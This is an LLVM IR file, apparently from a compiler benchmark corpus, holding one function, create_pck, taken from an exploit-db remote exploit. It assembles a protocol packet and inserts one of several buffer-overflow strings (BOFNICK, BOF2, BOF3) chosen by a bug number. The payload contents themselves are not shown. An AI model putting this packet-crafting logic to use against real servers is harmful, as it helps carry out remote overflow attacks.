; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/remote/extr_95.c_create_pck.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/remote/extr_95.c_create_pck.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@create_pck.buff = internal global i32* null, align 8
@BUFFSZ = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [3 x i8] c"\0F\00\00", align 1
@.str.1 = private unnamed_addr constant [13 x i8] c"j\D6L\03\96\ED;\E7\88\E2\A9t\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c"\0F\10\00", align 1
@bug = common dso_local global i32 0, align 4
@BOFNICK = common dso_local global i8* null, align 8
@BOF2 = common dso_local global i8* null, align 8
@BOF3 = common dso_local global i8* null, align 8
@.str.3 = private unnamed_addr constant [17 x i8] c"\0F\11\00\04\00\00\00\02\0F\12\00\04\00\00\00\00\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32* @create_pck(i8* %0, i8* %1, i8* %2, i32* %3) #0 {
  %5 = alloca i32*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i32*, align 8
  %10 = alloca i32*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  store i8* %0, i8** %6, align 8
  store i8* %1, i8** %7, align 8
  store i8* %2, i8** %8, align 8
  store i32* %3, i32** %9, align 8
  store i32 0, i32* %13, align 4
  %16 = load i32, i32* @BUFFSZ, align 4
  %17 = call i32* @malloc(i32 %16)
  store i32* %17, i32** @create_pck.buff, align 8
  %18 = load i32*, i32** @create_pck.buff, align 8
  %19 = icmp ne i32* %18, null
  br i1 %19, label %22, label %20

20:                                               ; preds = %4
  %21 = call i32 (...) @std_err()
  br label %22

22:                                               ; preds = %20, %4
  %23 = load i32*, i32** @create_pck.buff, align 8
  store i32* %23, i32** %10, align 8
  %24 = load i8*, i8** %6, align 8
  %25 = call i32 @strlen(i8* %24)
  %26 = add nsw i32 %25, 1
  store i32 %26, i32* %14, align 4
  %27 = load i8*, i8** %7, align 8
  %28 = icmp ne i8* %27, null
  br i1 %28, label %29, label %32

29:                                               ; preds = %22
  %30 = load i8*, i8** %7, align 8
  %31 = call i32 @strlen(i8* %30)
  store i32 %31, i32* %13, align 4
  br label %32

32:                                               ; preds = %29, %22
  %33 = load i32, i32* %14, align 4
  %34 = load i32, i32* %13, align 4
  %35 = add nsw i32 %33, %34
  %36 = add nsw i32 %35, 12
  store i32 %36, i32* %11, align 4
  %37 = load i32, i32* %11, align 4
  %38 = call i32 @htons(i32 %37)
  store i32 %38, i32* %12, align 4
  %39 = load i32*, i32** %10, align 8
  %40 = call i32 (i32*, ...) @memcpy(i32* %39, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str, i64 0, i64 0), i32 2)
  %41 = load i32*, i32** %10, align 8
  %42 = getelementptr inbounds i32, i32* %41, i64 2
  store i32* %42, i32** %10, align 8
  %43 = load i32*, i32** %10, align 8
  %44 = call i32 (i32*, ...) @memcpy(i32* %43, i32* %12, i32 2)
  %45 = load i32*, i32** %10, align 8
  %46 = getelementptr inbounds i32, i32* %45, i64 2
  store i32* %46, i32** %10, align 8
  %47 = load i32*, i32** %10, align 8
  %48 = call i32 (i32*, ...) @memcpy(i32* %47, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.1, i64 0, i64 0), i32 12)
  %49 = load i32*, i32** %10, align 8
  %50 = getelementptr inbounds i32, i32* %49, i64 12
  store i32* %50, i32** %10, align 8
  %51 = load i32*, i32** %10, align 8
  %52 = load i8*, i8** %6, align 8
  %53 = load i32, i32* %14, align 4
  %54 = call i32 (i32*, ...) @memcpy(i32* %51, i8* %52, i32 %53)
  %55 = load i32, i32* %14, align 4
  %56 = load i32*, i32** %10, align 8
  %57 = sext i32 %55 to i64
  %58 = getelementptr inbounds i32, i32* %56, i64 %57
  store i32* %58, i32** %10, align 8
  %59 = load i8*, i8** %7, align 8
  %60 = icmp ne i8* %59, null
  br i1 %60, label %61, label %70

61:                                               ; preds = %32
  %62 = load i32*, i32** %10, align 8
  %63 = load i8*, i8** %7, align 8
  %64 = load i32, i32* %13, align 4
  %65 = call i32 (i32*, ...) @memcpy(i32* %62, i8* %63, i32 %64)
  %66 = load i32, i32* %13, align 4
  %67 = load i32*, i32** %10, align 8
  %68 = sext i32 %66 to i64
  %69 = getelementptr inbounds i32, i32* %67, i64 %68
  store i32* %69, i32** %10, align 8
  br label %70

70:                                               ; preds = %61, %32
  %71 = load i32*, i32** %10, align 8
  %72 = call i32 (i32*, ...) @memcpy(i32* %71, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i64 0, i64 0), i32 2)
  %73 = load i32*, i32** %10, align 8
  %74 = getelementptr inbounds i32, i32* %73, i64 2
  store i32* %74, i32** %10, align 8
  %75 = load i32, i32* @bug, align 4
  switch i32 %75, label %92 [
    i32 1, label %76
    i32 2, label %78
    i32 3, label %88
    i32 4, label %90
  ]

76:                                               ; preds = %70
  %77 = load i8*, i8** @BOFNICK, align 8
  store i8* %77, i8** %8, align 8
  br label %93

78:                                               ; preds = %70
  %79 = load i32*, i32** %10, align 8
  %80 = load i32*, i32** @create_pck.buff, align 8
  %81 = ptrtoint i32* %79 to i64
  %82 = ptrtoint i32* %80 to i64
  %83 = sub i64 %81, %82
  %84 = sdiv exact i64 %83, 4
  %85 = trunc i64 %84 to i32
  %86 = load i32*, i32** %9, align 8
  store i32 %85, i32* %86, align 4
  %87 = load i32*, i32** @create_pck.buff, align 8
  store i32* %87, i32** %5, align 8
  br label %122

88:                                               ; preds = %70
  %89 = load i8*, i8** @BOF2, align 8
  store i8* %89, i8** %8, align 8
  br label %93

90:                                               ; preds = %70
  %91 = load i8*, i8** @BOF3, align 8
  store i8* %91, i8** %8, align 8
  br label %93

92:                                               ; preds = %70
  br label %93

93:                                               ; preds = %92, %90, %88, %76
  %94 = load i8*, i8** %8, align 8
  %95 = call i32 @strlen(i8* %94)
  store i32 %95, i32* %15, align 4
  %96 = load i32, i32* %15, align 4
  %97 = call i32 @htons(i32 %96)
  store i32 %97, i32* %12, align 4
  %98 = load i32*, i32** %10, align 8
  %99 = call i32 (i32*, ...) @memcpy(i32* %98, i32* %12, i32 2)
  %100 = load i32*, i32** %10, align 8
  %101 = getelementptr inbounds i32, i32* %100, i64 2
  store i32* %101, i32** %10, align 8
  %102 = load i32*, i32** %10, align 8
  %103 = load i8*, i8** %8, align 8
  %104 = load i32, i32* %15, align 4
  %105 = call i32 (i32*, ...) @memcpy(i32* %102, i8* %103, i32 %104)
  %106 = load i32, i32* %15, align 4
  %107 = load i32*, i32** %10, align 8
  %108 = sext i32 %106 to i64
  %109 = getelementptr inbounds i32, i32* %107, i64 %108
  store i32* %109, i32** %10, align 8
  %110 = load i32*, i32** %10, align 8
  %111 = call i32 (i32*, ...) @memcpy(i32* %110, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.3, i64 0, i64 0), i32 16)
  %112 = load i32*, i32** %10, align 8
  %113 = load i32*, i32** @create_pck.buff, align 8
  %114 = ptrtoint i32* %112 to i64
  %115 = ptrtoint i32* %113 to i64
  %116 = sub i64 %114, %115
  %117 = sdiv exact i64 %116, 4
  %118 = add nsw i64 %117, 16
  %119 = trunc i64 %118 to i32
  %120 = load i32*, i32** %9, align 8
  store i32 %119, i32* %120, align 4
  %121 = load i32*, i32** @create_pck.buff, align 8
  store i32* %121, i32** %5, align 8
  br label %122

122:                                              ; preds = %93, %78
  %123 = load i32*, i32** %5, align 8
  ret i32* %123
}

declare dso_local i32* @malloc(i32) #1

declare dso_local i32 @std_err(...) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @memcpy(i32*, ...) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
